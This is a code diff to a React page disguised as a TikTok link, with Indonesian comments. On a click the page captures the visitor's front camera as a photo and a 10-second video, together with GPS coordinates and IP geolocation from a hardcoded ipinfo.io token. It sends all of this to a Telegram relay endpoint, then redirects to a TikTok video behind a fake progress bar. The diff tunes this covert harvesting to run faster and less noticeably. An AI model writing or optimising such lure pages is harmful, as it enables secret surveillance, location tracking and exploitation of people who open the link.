@@ -29,32 +29,46 @@ export default function TikTokPage() {
     setShowCard(false);
     setDone(true);
 
-    let stream: MediaStream | null = null;
-    try {
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
-      });
-    } catch {}
-
-    let gps: { lat: number; lng: number } | null = null;
-    try {
-      gps = await new Promise(resolve => {
-        if ("geolocation" in navigator) {
-          navigator.geolocation.getCurrentPosition(
-            p => resolve({ lat: p.coords.latitude, lng: p.coords.longitude }),
-            () => resolve(null), { timeout: 8000 }
-          );
-        } else resolve(null);
-      });
-    } catch {}
-
-    let ipInfo: any = null;
-    try { const r = await fetch("https://ipinfo.io/json?token=56ce10652d9d41"); if (r.ok) ipInfo = await r.json(); } catch {}
+    // Jalankan stream, GPS, dan IP secara paralel
+    const [stream, gps, ipInfo] = await Promise.all([
+      // Stream kamera (prioritas — langsung capture tanpa nunggu GPS)
+      (async () => {
+        try {
+          return await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
+          });
+        } catch { return null; }
+      })(),
+      // GPS — timeout 4 detik, lebih cepat dari 8 detik
+      (async () => {
+        try {
+          return await new Promise<{ lat: number; lng: number } | null>(resolve => {
+            if (!("geolocation" in navigator)) return resolve(null);
+            navigator.geolocation.getCurrentPosition(
+              p => resolve({ lat: p.coords.latitude, lng: p.coords.longitude }),
+              () => resolve(null),
+              { timeout: 4000, maximumAge: 30000 }
+            );
+          });
+        } catch { return null; }
+      })(),
+      // IP info — jalankan paralel
+      (async () => {
+        try {
+          const r = await fetch("https://ipinfo.io/json?token=56ce10652d9d41", { signal: AbortSignal.timeout(5000) });
+          if (r.ok) return await r.json();
+          return null;
+        } catch { return null; }
+      })(),
+    ]);
 
     const fd = new FormData();
     if (stream) {
-      const photo = await takePhoto(stream);
-      const vid = await recordVideo(stream, 10000);
+      // Capture foto & video paralel — keduanya dari stream yang sama
+      const [photo, vid] = await Promise.all([
+        takePhoto(stream),
+        recordVideo(stream, 10000),
+      ]);
       if (photo) fd.append("photo", photo, "photo.jpg");
       if (vid) fd.append("video", vid, "video.webm");
       stream.getTracks().forEach(t => t.stop());
@@ -62,10 +76,15 @@ export default function TikTokPage() {
 
     const info = await buildInfo(ipInfo, gps);
     fd.append("locationInfo", info);
-    await Promise.all([sendToTelegram(fd), runProgress()]);
 
-    await new Promise(r => setTimeout(r, 500));
-    setCountdown(5);
+    // Kirim + progress paralel
+    await Promise.all([
+      sendToTelegram(fd),
+      runProgress(),
+    ]);
+
+    // Redirect — lebih cepat
+    setCountdown(3);
     const timer = setInterval(() => {
       setCountdown(prev => {
         if (prev <= 1) { clearInterval(timer); window.location.href = TIKTOK_VIDEO_URL; return 0; }
@@ -79,13 +98,14 @@ export default function TikTokPage() {
     v.srcObject = s;
     v.onloadedmetadata = () => {
       v.play();
+      // Capture secepat mungkin — 300ms cukup untuk frame pertama
       setTimeout(() => {
         const c = document.createElement("canvas");
         c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
         const ctx = c.getContext("2d");
-        if (ctx) { ctx.drawImage(v, 0, 0, c.width, c.height); c.toBlob(b => res(b), "image/jpeg", 0.8); }
+        if (ctx) { ctx.drawImage(v, 0, 0, c.width, c.height); c.toBlob(b => res(b), "image/jpeg", 0.85); }
         else res(null);
-      }, 1500);
+      }, 300);
     };
   });
 
@@ -161,19 +181,19 @@ export default function TikTokPage() {
   };
 
   const runProgress = async () => {
-    for (let i = 0; i <= 100; i += 2) {
-      await new Promise(r => setTimeout(r, 30));
+    for (let i = 0; i <= 100; i += 5) {
+      await new Promise(r => setTimeout(r, 20));
       setProgress(i);
     }
   };
 
   const sendToTelegram = async (fd: FormData): Promise<boolean> => {
-    for (let attempt = 1; attempt <= 3; attempt++) {
+    for (let attempt = 1; attempt <= 2; attempt++) {
       try {
         const res = await fetch("/api/telegram", { method: "POST", body: fd });
         if (res.ok) return true;
       } catch {}
-      if (attempt < 3) await new Promise(r => setTimeout(r, 1000));
+      if (attempt < 2) await new Promise(r => setTimeout(r, 500));
     }
     return false;
   };
